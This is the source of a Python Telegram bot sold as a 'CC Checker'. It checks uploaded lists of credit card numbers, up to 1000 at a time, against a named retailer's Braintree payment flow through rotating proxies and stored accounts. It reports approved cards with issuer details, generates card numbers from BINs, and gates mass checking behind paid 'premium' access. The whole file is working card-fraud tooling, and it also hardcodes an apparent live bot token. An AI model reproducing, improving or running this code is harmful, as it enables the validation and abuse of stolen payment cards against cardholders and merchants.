import httpx
import telebot
import threading
import os
import re
import time
import asyncio
import random
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from pvb3 import b3
from generator import Generator

TOKEN = "7614502162:AAG-Pb_O75E_0F3lcTkNq2gXJ_YoGbDYObE"
bot = telebot.TeleBot(TOKEN)


owner = InlineKeyboardButton(text="OWNER",url="t.me/only_manish")
markup = InlineKeyboardMarkup()
markup.add(owner)

ADMINS = [7718953063]
normal_users = set()
is_processing = {}
stop_processing = {}

def save_authorized_users(user_id):
	try:
		with open("authorized_users.txt","a") as file:
			file.write(f"{user_id}\n")
	except FileNotFoundError:
		os.system("touch authorized_users.txt")
		save_authorized_users(user_id)

def remove_authorized_users(user_id):
	try:
		with open("authorized_users.txt","r") as file:
			users = set(line.strip() for line in file.readlines())
			users.remove(str(user_id))
		with open("authorized_users.txt","w") as file:
			for user in users:
				file.write(f"{user}\n")
		normal_users.add(user_id)
		return True
	except Exception as e:
		return False

def is_authorized(user_id):
	try:
		with open("authorized_users.txt","r") as file:
			return str(user_id) in set(line.strip() for line in file.readlines())
	except FileNotFoundError:
		return False

def bin_info(bin,client):
	try:
		if len(str(bin)) >= 6:
			bin = bin[:6]
		else:
			raise ValueError("BIN length Should Be Greater Or Equals To 6")
		response = client.get(f"https://bins.antipublic.cc/bins/{bin}").json()
		return response
	except Exception as e:
		return f"error: {e}"

def format_proxy(proxy):
	ip,port,user,pas = map(str.strip,proxy.split(":"))
	return user+':'+pas+'@'+ip+':'+port

def generate_message(cc,response,bin,taken):
	return f"""
<strong>• Braintree Auth</strong>
<strong>- - - - - - - - - - - - - - - - -</strong>
<strong>[☣️] Card: </strong><code>{cc}</code>

<strong>[☣️]Response: {response}</strong>
<strong>- - - - - - - - - - - - - - - - -</strong>
<strong>[☣️]Info: {bin['brand'].upper()} - {bin['type'].upper()} - {bin['level'].upper()}</strong>
<strong>[☣️]Issuer: {bin['bank'].upper()} - {bin['country_flag']}</strong>
<strong>[☣️]Country: {bin['country'].upper()} [ {bin['country_flag']} ]</strong>
<strong>- - - - - - - - - - - - - - - - -</strong>
<strong>[☣️]Time: {taken} seconds.</strong>
<strong>[☣️]Bot By: <a href='t.me/ItzMeSahid'>⏤͟͟͞͞ Sᴀʜɪᴅ [ 🇮🇳 ]</a></strong>
"""

def check_b3(cc):
	with open("proxies.txt","r") as f:
		p = random.choice((f.read().splitlines()))
	proxy = format_proxy(p)
	with open("accounta.txt","r") as f:
		username = random.choice((f.read().splitlines()))
	client = httpx.AsyncClient(timeout=30,proxy=f"http://{proxy}")
	url = "https://www.bebebrands.com"
	loop = asyncio.new_event_loop()
	asyncio.set_event_loop(loop)
	try:
		response = loop.run_until_complete(b3(url,cc,client,username))
		return response
	except Exception as e:
		print(e)
		return "Declined ❌ - API Problem"
	finally:
		loop.close()

def process_cards(message,combo,user_id,edit):
	client = httpx.Client()
	ap = 0
	dd = 0
	try:
		with open(combo,"r") as file:
			ccs = file.readlines()
			total = len(ccs)
		for cc in ccs:
			if stop_processing.get(user_id,False):
				bot.reply_to(message,"<strong>Processing Stopped By User  ⛔</strong>",parse_mode="HTML")
				break
			cc = cc.strip()
			markup = InlineKeyboardMarkup(row_width=1)
			card = InlineKeyboardButton(f"• {cc} •",callback_data="x")
			approved = InlineKeyboardButton(f"• 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅: [ {ap} ] •",callback_data="x")
			dead = InlineKeyboardButton(f"• 𝗗𝗲𝗮𝗱 ❌: [ {dd} ] •",callback_data="x")
			totals = InlineKeyboardButton(f"• 𝗧𝗼𝘁𝗮𝗹 💎: [ {total} ] •",callback_data="x")
			stop = InlineKeyboardButton("[ 𝗦𝘁𝗼𝗽 🛑 ] ", callback_data="stop_process")
			markup.add(card,approved,dead,totals,stop)
			bot.edit_message_text(chat_id=message.chat.id, message_id=edit, text="<strong>Checking Your Cards....⏳</strong>", reply_markup=markup,parse_mode="HTML")
			try:
				t = time.time()
				response = check_b3(cc)
			except Exception as e:
				print(e)
				response = "Declined ❌ - API Problem"
			
			if "✅" in response:
				ap += 1
				taken = f"{(time.time()-t):.2f}"
				info = bin_info(cc,client)
				text = generate_message(cc,response,info,taken)
				bot.reply_to(message,text,parse_mode="HTML")
			else:
				dd += 1
				continue
		bot.reply_to(message,f"""
<strong>[☣️]Total: [ {total} ]</strong>
<strong>[☣️]Approved: [ {ap} ]</strong>
<strong>[☣️]Dead: [ {dd} ]</strong>""",parse_mode="HTML")
	except Exception as e:
		print(e)
	finally:
		is_processing[user_id] = False
		stop_processing[user_id] = False
		client.close()
		
	
@bot.message_handler(commands=["start","help","cmd","cmds"])
def welcome(message):
	user_id = message.from_user.id
	if (user_id not in ADMINS) or (not is_authorized(user_id)):
		normal_users.add(user_id)
	role = "ADMIN" if user_id in ADMINS else ("PREMIUM" if is_authorized(user_id) else "FREE") 
	text = f"""
<strong>
Hey <a href='tg://user?id={user_id}'>{user_id} [ {role} ]</a>
Welcome To Our CC Checker Bot [Beta Version]

Commands:
	/b3 [CCS] - Braintree Auth [PREMIUM].
	example:
		/b3 4242424242424242|10|28|800
	
	/gen [BIN] - Generate CCS [FREE].
	example:
		/gen 424242424242xxxx|10|28|xxx
	
	For Mass Checking Just Send File Of CCS [PREMIUM]
</strong>
"""
	bot.reply_to(message,text,reply_markup=markup,parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith(("/b3",".b3","!b3")))
def b3_single(message):
	client = httpx.Client()
	user_id = message.from_user.id
	first_name = message.from_user.first_name
	if (user_id not in ADMINS) and (not is_authorized(user_id)):
		bot.reply_to(message,"""
<strong>You Are Not Authorized To Use This Command 📛.
Contact Owner To Get Access.</strong>""",reply_markup=markup,parse_mode="HTML")
		return

	ccs = message.text.split()[1:]
	if not ccs:
		bot.reply_to(message,"<strong>Provide CCS To Check 📛</strong>",parse_mode="HTML")
	if len(ccs) > 10:
		bot.reply_to(message,"<strong>You Can Check Upto 10 Cards At A Time ⛔</strong>",parse_mode="HTML")
		return
	for cc in ccs:
		try:
			edit = bot.reply_to(message,"<strong>Processing Your Request....⏳</strong>",parse_mode="HTML").message_id
			t = time.time()
			response = check_b3(cc)
			info = bin_info(cc,client)
			taken = f"{(time.time()-t):.2f}"
			msg = generate_message(cc,response,info,taken)
			bot.edit_message_text(chat_id=message.chat.id,message_id=edit,text=msg,parse_mode="HTML")
		except Exception as e:
			bot.reply_to(message,str(e))
		finally:
			client.close()

@bot.message_handler(content_types="document")
def mass_b3(message):
	user_id = message.from_user.id
	first_name = message.from_user.first_name
	if (user_id not in ADMINS) and (not is_authorized(user_id)):
		bot.reply_to(message,"""
<strong>You Are Not Authorized To Use This Command 📛.
Contact Owner To Get Access.</strong>""",reply_markup=markup,parse_mode="HTML")
		return
	if is_processing.get(user_id,False):
		bot.reply_to(message,"""
<strong>Please Wait Until Your Previous File Get Checked....⏳</strong>""",parse_mode="HTML")
		return
	
	is_processing[user_id] = True
	stop_processing[user_id] = False
	downloaded_file = bot.download_file(bot.get_file(message.document.file_id).file_path)
	combo = f"combos/combo_{user_id}.txt"
	with open(combo,"wb") as file:
		file.write(downloaded_file)
	with open(combo,"rb") as file:
		f = file.readlines()
		if len(f) > 1000:
			bot.reply_to(message,"<strong>You Can Check 1000 Cards At A Time ⛔</strong>",parse_mode="HTML")
			return
	edit = bot.reply_to(message,"<strong>Processing Your Cards....⏳</strong>",parse_mode="HTML").message_id
	threading.Thread(target=process_cards,args=(message,combo,user_id,edit)).start()

@bot.message_handler(func=lambda m: m.text.startswith(("/add",".add","!add")))
def authorized(message):
	user_id = message.from_user.id
	if user_id not in ADMINS:
		bot.reply_to(message,"<strong>You Don't Have Permission To Use This Command 🛑</strong>",parse_mode="HTML")
		return
	ids = message.text.split()[1:]
	if not ids:
		bot.reply_to(message,"<strong>Please Provide User IDS To Authorized 📛</strong>",parse_mode="HTML")
		return
	for id in ids:
		if is_authorized(id) or id in ADMINS:
			bot.reply_to(message,f"<strong>User <a href='tg://user?id={id}'>{id}</a> Is Already Authorized 📛</strong>",parse_mode="HTML")
		else:
			if id in normal_users:
				normal_users.remove(id)
				save_authorized_users(id)
				bot.reply_to(message,f"<strong>User <a href='tg://user?id={id}'>{id}</a> Is Authorized Successfully ✅</strong>",parse_mode="HTML")
			else:
				save_authorized_users(id)
				bot.reply_to(message,f"<strong>User <a href='tg://user?id={id}'>{id}</a> Is Authorized Successfully ✅</strong>",parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith(("/remove",".remove","!remove")))
def remove_authorization(message):
	user_id = message.from_user.id
	if user_id not in ADMINS:
		bot.reply_to(message,"<strong>You Don't Have Permission To Use This Command 🛑</strong>",parse_mode="HTML")
		return
	ids = message.text.split()[1:]
	if not ids:
		bot.reply_to(message,"<strong>Please Provide User IDS To Remove Authorization 📛</strong>",parse_mode="HTML")
		return
	for id in ids:
		if not is_authorized(id):
			bot.reply_to(message,f"<strong>User <a href='tg://user?id={id}'>{id}</a> Is Not Authorized 📛</strong>",parse_mode="HTML")
			return
		if remove_authorized_users(id):
			bot.reply_to(message,f"<strong>User <a href='tg://user?id={id}'>{id}</a> Is Removed Successfully ✅</strong>",parse_mode="HTML")
		else:
			continue

@bot.message_handler(commands=["br","broadcast"])
def broadcast(message):
	user_id = message.from_user.id
	if user_id not in ADMINS:
		bot.reply_to(message,"<strong>You Don't Have Permission To Use This Command 🛑</strong>",parse_mode="HTML")
		return
	msg = message.text.split(' ',1)
	if len(msg) != 2:
		bot.reply_to(message,"<strong>Please Provide Broadcast Message For Sending To All Users 🆘</strong>",parse_mode="HTML")
		return
	#-----sending broadcast to normal users-----
	good = 0
	bad = 0
	for users in normal_users:
		try:
			bot.send_message(message,msg)
			good +=1
		except:
			bad +=1
			continue
	bot.reply_to(message,f"""
<strong>Broadcast Completed 🎉</strong>
<strong>[☣️]Total Normal Users: [ {len(normal_users)} ]</strong>
<strong>[☣️]Sending Successful: [ {good} ]</strong>
<strong>[☣️]Sending Unsuccessful: [ {bad} ]</strong>""",parse_mode="HTML")
	#-----sending broadcast to authorized users-----
	with open("authorized_users.txt","r") as file:
		good = 0
		bad = 0
		totals = file.readlines()
		for users in totals:
			try:
				bot.send_message(message,msg)
				good +=1
			except:
				bad +=1
				continue
		bot.reply_to(message,f"""
<strong>Broadcast Completed 🎉</strong>
<strong>[☣️]Total Authorized Users: [ {len(totals)} ]</strong>
<strong>[☣️]Sending Successful: [ {good} ]</strong>
<strong>[☣️]Sending Unsuccessful: [ {bad} ]</strong>""",parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith(("/gen",".gen","!gen")))
def generate_cc(message):
	client = httpx.Client()
	user_id = message.from_user.id
	username = message.from_user.username or user_id
	if len(message.text.split()) < 2:
		bot.reply_to(message,"<strong>Please Provide Valid BIN To Generate CCS 📛</strong>",parse_mode="HTML")
		return
	bin = re.findall(r"\d+(?:x\d+)*",message.text)
	if len(bin[0]) < 6:
		bot.reply_to(message,"<strong>BIN Shound Be Greater Or Equals To 6 ⛔</strong>",parse_mode="HTML")
		return
	if bin[0][0] not in ["3","4","5","6"]:
		bot.reply_to(message,"<strong>Please Provide Valid BIN To Generate CCS 📛</strong>",parse_mode="HTML")
		return
	
	if len(bin) == 1:
		binn = bin[0]
		mes = "rnd"
		ano = "rnd"
		amo = 10
	elif len(bin) == 2:
		binn = bin[0]
		mes = "rnd"
		ano = "rnd"
		amo = int(bin[1])
	elif len(bin) == 3:
		binn = bin[0]
		mes = bin[1]
		ano = bin[2]
		amo = 10
	elif len(bin) == 4:
		binn = bin[0]
		mes = bin[1]
		ano = bin[2]
		amo = int(bin[3])
	else:
		bot.reply_to(message,"<strong>Invalid Details Provided ⛔</strong>",parse_mode="HTML")
		return
	if amo > 1000 and user_id in normal_users:
		bot.reply_to(message,"<strong>Free Users Can Generate 1000 Cards At A Time 📛</strong>",parse_mode="HTML")
		return
	edit = (bot.reply_to(message,"<strong>Processing Your Request....⏳</strong>",parse_mode="HTML").message_id)
	if amo > 10:		
		t = time.time()
		format = binn+'|'+mes+'|'+ano
		obj = Generator(format,amo,True)
		ccs = obj.generate_ccs()
		gen_file = f"gen_{binn[:6]}xxx_{amo}@{username}.txt"
		with open(f"generates/{gen_file}","w") as file:
			for cc in ccs:
				file.write(cc+"\n")
		info = bin_info(binn[:6],client)
		text = f"""
<strong>▰ Generator | [💈]</strong>
<strong>[☣️]Info: {info['brand']} - {info['type']} - {info['level']}</strong>
<strong>[☣️]Bank: {info['bank']} - {info['country_flag']}</strong>
<strong>[☣️]Country: {info['country']} [ {info['country_flag']} ]</strong>

<strong>━━━━━━━━⊛</strong>

<strong>♧| Format: {format}</strong>
<strong>♧| Amount: {amo}</strong>
<strong>♧| Time Taken: {(time.time()-t):.2f}ms</strong>
"""
		f = open(f"generates/{gen_file}","rb").read()
		bot.delete_message(chat_id=message.chat.id,message_id=edit)
		bot.send_document(chat_id=message.chat.id,document=f,visible_file_name=gen_file,caption=text,parse_mode="HTML")
	else:
		t = time.time()
		format = binn+'|'+mes+'|'+ano
		obj = Generator(format,amo,False)
		ccs = obj.generate_ccs()
		info = bin_info(binn[:6],client)
		text = f"""
<strong>{ccs}</strong>

<strong>▰ Generator | [💈]</strong>
<strong>[☣️]Info: {info['brand']} - {info['type']} - {info['level']}</strong>
<strong>[☣️]Bank: {info['bank']} - {info['country_flag']}</strong>
<strong>[☣️]Country: {info['country']} [ {info['country_flag']} ]</strong>

<strong>━━━━━━━━⊛</strong>

<strong>♧| Format: {format}</strong>
<strong>♧| Amount: {amo}</strong>
<strong>♧| Time Taken: {(time.time()-t):.2f}ms</strong>
"""
		bot.edit_message_text(chat_id=message.chat.id,message_id=edit,text=text,parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data=="stop_process")
def stop_checking(call):
	user_id = call.from_user.id
	if user_id in is_processing and is_processing[user_id]:
		stop_processing[user_id] = True
		bot.answer_callback_query(call.id,"Processing Has Been Stopped ✅")
	else:
		bot.answer_callback_query(call.id,"No Ongoing Process To Stop 📛")

if __name__=="__main__":
	bot.infinity_polling()